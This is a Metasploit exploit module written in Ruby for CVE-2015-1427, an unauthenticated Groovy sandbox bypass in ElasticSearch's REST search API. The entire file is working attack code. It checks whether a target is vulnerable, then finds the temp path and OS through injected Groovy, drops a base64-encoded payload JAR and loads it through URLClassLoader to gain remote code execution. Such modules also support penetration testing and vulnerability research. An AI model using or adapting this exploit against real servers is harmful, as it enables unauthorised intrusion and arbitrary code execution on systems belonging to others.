# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FileDropper
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;ElasticSearch Search Groovy Sandbox Bypass&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a remote command execution (RCE) vulnerability in ElasticSearch,
        exploitable by default on ElasticSearch prior to 1.4.3. The bug is found in the
        REST API, which does not require authentication, where the search function allows
        groovy code execution and its sandbox can be bypassed using java.lang.Math.class.forName
        to reference arbitrary classes. It can be used to execute arbitrary Java code. This
        module has been tested successfully on ElasticSearch 1.4.2 on Ubuntu Server 12.04.
      },
      &#039;Author&#039;         =>
        [
          &#039;Cameron Morris&#039;, # Vulnerability discovery
          &#039;Darren Martyn&#039;, # Public Exploit
          &#039;juan vazquez&#039;   # Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2015-1427&#039;],
          [&#039;URL&#039;, &#039;https://jordan-wright.github.io/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/&#039;],
          [&#039;URL&#039;, &#039;https://github.com/XiphosResearch/exploits/tree/master/ElasticSearch&#039;],
          [&#039;URL&#039;, &#039;http://drops.wooyun.org/papers/5107&#039;]
        ],
      &#039;Platform&#039;       => &#039;java&#039;,
      &#039;Arch&#039;           => ARCH_JAVA,
      &#039;Targets&#039;        =>
        [
          [&#039;ElasticSearch 1.4.2&#039;, {}]
        ],
      &#039;DisclosureDate&#039; => &#039;Feb 11 2015&#039;,
      &#039;DefaultTarget&#039; => 0))

      register_options(
        [
          Opt::RPORT(9200),
          OptString.new(&#039;TARGETURI&#039;, [true, &#039;The path to the ElasticSearch REST API&#039;, "/"])
        ], self.class)
  end

  def check
    result = Exploit::CheckCode::Safe

    if vulnerable?
      result = Exploit::CheckCode::Vulnerable
    end

    result
  end

  def exploit
    print_status("#{peer} - Checking vulnerability...")
    unless vulnerable?
      fail_with(Failure::Unknown, "#{peer} - Java has not been executed, aborting...")
    end

    print_status("#{peer} - Discovering TEMP path...")
    res = execute(java_tmp_dir)
    tmp_dir = parse_result(res)
    if tmp_dir.nil?
      fail_with(Failure::Unknown, "#{peer} - Could not identify TEMP path...")
    else
      print_good("#{peer} - TEMP path on &#039;#{tmp_dir}&#039;")
    end

    print_status("#{peer} - Discovering remote OS...")
    res = execute(java_os)
    os = parse_result(res)
    if os.nil?
      fail_with(Failure::Unknown, "#{peer} - Could not identify remote OS...")
    else
      print_good("#{peer} - Remote OS is &#039;#{os}&#039;")
    end

    if os =~ /win/i
      tmp_file = "#{tmp_dir}#{rand_text_alpha(4 + rand(4))}.jar"
    else
      tmp_file = File.join(tmp_dir, "#{rand_text_alpha(4 + rand(4))}.jar")
    end

    register_files_for_cleanup(tmp_file)

    print_status("#{peer} - Trying to load metasploit payload...")
    java = java_load_class(os, tmp_file)
    execute(java)
  end

  def vulnerable?
    java = &#039;java.lang.Math.class.forName("java.lang.Runtime")&#039;

    vprint_status("#{peer} - Trying to get a reference to java.lang.Runtime...")
    res = execute(java)
    result = parse_result(res)

    if result.nil?
      vprint_status("#{peer} - no response to test")
      return false
    elsif result == &#039;class java.lang.Runtime&#039;
      return true
    end

    false
  end

  def parse_result(res)
    unless res
      vprint_error("#{peer} - No response")
      return nil
    end

    unless res.code == 200 && res.body
      vprint_error("#{peer} - Target answered with HTTP code #{res.code} (with#{res.body ? &#039;&#039; : &#039;out&#039;} a body)")
      return nil
    end

    begin
      json = JSON.parse(res.body.to_s)
    rescue JSON::ParserError
      return nil
    end

    begin
      result = json[&#039;hits&#039;][&#039;hits&#039;][0][&#039;fields&#039;][&#039;msf_result&#039;]
    rescue
      return nil
    end

    result.is_a?(::Array) ? result.first : result
  end

  def java_tmp_dir
    &#039;java.lang.Math.class.forName("java.lang.System").getProperty("java.io.tmpdir")&#039;
  end

  def java_os
    &#039;java.lang.Math.class.forName("java.lang.System").getProperty("os.name")&#039;
  end

  def java_load_class(os, tmp_file)
    if os =~ /win/i
      tmp_file.gsub!(/\\/, &#039;\\\\\\\\&#039;)
    end

    java = [
      &#039;c=java.lang.Math.class.forName("java.io.FileOutputStream");&#039;,
      &#039;b64=java.lang.Math.class.forName("sun.misc.BASE64Decoder");&#039;,
      "i=c.getDeclaredConstructor(String.class).newInstance(\"#{tmp_file}\");",
      &#039;b64_i=b64.newInstance();&#039;,
      "i.write(b64_i.decodeBuffer(\"#{Rex::Text.encode_base64(payload.encoded)}\"));",
      &#039;loader_class=java.lang.Math.class.forName("java.net.URLClassLoader");&#039;,
      &#039;file_class=java.lang.Math.class.forName("java.io.File");&#039;,
      "file_url=file_class.getDeclaredConstructor(String.class).newInstance(\"#{tmp_file}\").toURI().toURL();",
      &#039;loader=loader_class.newInstance();&#039;,
      &#039;loader.addURL(file_url);&#039;,
      &#039;m=loader.loadClass(\&#039;metasploit.Payload\&#039;);&#039;,
      &#039;m.main(null);&#039;
    ]

    java.join
  end

  def execute(java, timeout = 20)
    payload = {
      "size" => 1,
      "query" => {
        "filtered" => {
          "query" => {
            "match_all" => {}
          }
        }
      },
      "script_fields" => {
        "msf_result" => {
          "script" => java
        }
      }
    }

    res = send_request_cgi({
      &#039;uri&#039;    => normalize_uri(target_uri.path.to_s, "_search"),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;data&#039;   => JSON.generate(payload)
    }, timeout)

    res
  end

end

